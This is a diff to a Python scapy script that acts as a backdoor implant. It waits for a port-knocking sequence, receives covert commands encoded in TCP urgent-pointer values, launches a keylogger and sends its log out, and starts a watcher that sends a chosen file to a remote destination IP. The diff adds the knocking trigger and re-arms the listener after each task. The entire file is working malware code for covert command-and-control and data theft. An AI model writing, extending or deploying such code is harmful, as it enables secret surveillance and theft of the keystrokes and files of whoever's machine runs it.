@@ -1,10 +1,13 @@
-from scapy.all import sniff, TCP
+from scapy.all import sniff, TCP, IP, send
 import base64
+from scapy.layers.inet import IP
 import os
 import time
 import subprocess
 import threading
 import socket
+import requests  # Add this import for sending HTTP requests
+
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -35,9 +38,54 @@ current_signal = None
 signal_received = False
 keylogger_process = None
 watcher_process = None
+knock_sequence = [3434, 4545, 5656] 
+knock_index = 0
+communication_port = 80
+ack_event = threading.Event()
+timeout = 10  # Timeout in seconds for acknowledgment
+knock_ip = None
+
+def send_acknowledgment(ip, port):
+    """Send a TCP acknowledgment packet back to the original sender."""
+    ip_layer = IP(dst=ip)
+    # Change flags from "A" to "SA" and use sport=80 to match expected port
+    tcp_layer = TCP(sport=80, dport=port, flags="SA")
+    ack_packet = ip_layer/tcp_layer
+    send(ack_packet)
+    print(f"Sent acknowledgment to {ip}:{port}")
 
 def packet_callback(packet):
     """Callback function to process each sniffed packet."""
+    global current_signal, received_data, signal_received, knock_index, knock_ip
+    if packet.haslayer(TCP):
+        src_ip = packet[IP].src
+        src_port = packet[TCP].sport
+        dport = packet[TCP].dport
+
+        if knock_index == 0 and dport == knock_sequence[0]:
+            knock_ip = src_ip
+            knock_index += 1
+            print(f"First port knock detected.")
+        elif knock_index > 0 and src_ip == knock_ip:
+            if dport in knock_sequence[1:]:
+                knock_index += 1
+                if knock_index == len(knock_sequence):
+                    print("Port-knocking sequence completed. Sending acknowledgment.")
+                    # Simple acknowledgment - just send one SYN-ACK packet
+                    ack = IP(dst=src_ip)/TCP(sport=80, dport=src_port, flags="SA")
+                    send(ack)
+                    knock_index = 0
+                    knock_ip = None
+                    wait_for_signal()
+
+def wait_for_signal():
+    """Wait for a signal after port-knocking sequence."""
+    print("Waiting for signal...")
+    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': signal_callback, 'store': 0})
+    sniff_thread.start()
+
+def signal_callback(packet):
+    """Callback function to process each sniffed packet for signals."""
     global current_signal, received_data, signal_received
     if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
         urgent_pointer_value = packet[TCP].urgptr
@@ -49,7 +97,7 @@ def packet_callback(packet):
                 signal_received = True
                 print(f"Initial Signal Received: {current_signal}")
                 handle_initial_signal()
-            return
+                return
 
         # Process urgent pointer data
         urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
@@ -67,10 +115,12 @@ def packet_callback(packet):
                 print("EOF signal detected.")
                 handle_data(decoded_data.replace(eof_signal.encode(), b''))
                 reset_state()
+                wait_for_port_knocking()
             elif received_data.endswith(base64.b64encode(eof_signal.encode()).decode()):
                 print("EOF signal detected in the last packet.")
                 handle_data(decoded_data.replace(eof_signal.encode(), b''))
                 reset_state()
+                wait_for_port_knocking()
         except (UnicodeDecodeError, base64.binascii.Error) as e:
             print(f"Decoding error: {e}")
 
@@ -93,10 +143,10 @@ def handle_initial_signal():
 def start_keylogger():
     """Start the keylogger process."""
     global keylogger_process
-    script_dir = os.path.dirname(os.path.abspath(__file__))
+    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
     keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
     reset_state()
-    start()
+    wait_for_port_knocking()
 
 def stop_keylogger():
     """Stop the keylogger process and send the log file."""
@@ -108,14 +158,15 @@ def stop_keylogger():
     send_log_file()
     print("Keylogger stopped and log file sent.")
     reset_state()
+    wait_for_port_knocking()
 
 def start_watcher(file_path):
     """Start the watcher process."""
     global watcher_process
-    script_dir = os.path.dirname(os.path.abspath(__file__))
+    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
     watcher_process = subprocess.Popen(['python3', os.path.join(script_dir, 'watcher.py'), file_path, dest_ip])
     reset_state()
-    start()
+    wait_for_port_knocking()
 
 def stop_watcher():
     """Stop the watcher process."""
@@ -124,6 +175,7 @@ def stop_watcher():
         watcher_process.terminate()
         watcher_process = None
     reset_state()
+    wait_for_port_knocking()
 
 def send_log_file():
     """Send the log file using the encoder script."""
@@ -136,7 +188,7 @@ def send_log_file():
 def prepare_file_transfer():
     """Prepare for file transfer by starting the sniffing process."""
     while current_signal == file_transfer_signal:
-        start()
+        wait_for_signal()
 
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
@@ -191,15 +243,20 @@ def reset_state():
     signal_received = False
     print("State reset.")
 
-def start():
-    """Start sniffing for packets."""
-    print(f"Local IP: {local_ip}")
-    print("Waiting for signal...")
-    sniff(filter=f"tcp and dst host {local_ip} and src port {source_port} and dst port {dest_port}", prn=packet_callback, store=0)
+def open_communication_port():
+    """Open the designated communication port."""
+    global communication_port
+    print(f"Communication port {communication_port} opened.")
+
+def wait_for_port_knocking():
+    """Wait for the port-knocking sequence."""
+    print("Waiting for port-knocking sequence...")
+    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': packet_callback, 'store': 0})
+    sniff_thread.start()
 
 def run_async_task(task):
     """Run a task asynchronously."""
     threading.Thread(target=task).start()
 
 if __name__ == "__main__":
-    start()
+    wait_for_port_knocking()
